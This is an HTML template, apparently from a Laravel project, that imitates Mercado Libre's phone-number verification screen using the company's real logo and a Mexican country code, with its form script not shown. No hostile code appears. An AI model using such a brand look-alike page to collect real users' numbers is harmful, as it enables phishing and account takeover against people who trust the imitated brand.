<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresa tu número de Teléfono</title>
    <link rel="stylesheet" href="{{ asset('css/StyleCambiarNumero.css') }}">
</head>
<body>
    <header class="header">
        <img src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.18.1/mercadolibre/logo__small.png" alt="Mercado Libre Logo" class="logo">
    </header>
    
    <main class="content">
        <div class="phone-box">
            <h2>Ingresa tu número de teléfono</h2>
            <p>Te enviaremos un código de verificación para confirmar que tienes acceso al teléfono.</p>
            <div class="phone-input-container">
                <span class="country-code">+52</span>
                <input type="tel" placeholder="Código de área + número" class="phone-input" id="phone-input">
            </div>
            <button class="submit-btn" id="submit-btn" disabled>Continuar</button>
        </div>
    </main>
    <script src="CambiarNumero.js" defer></script>
</body>
</html>
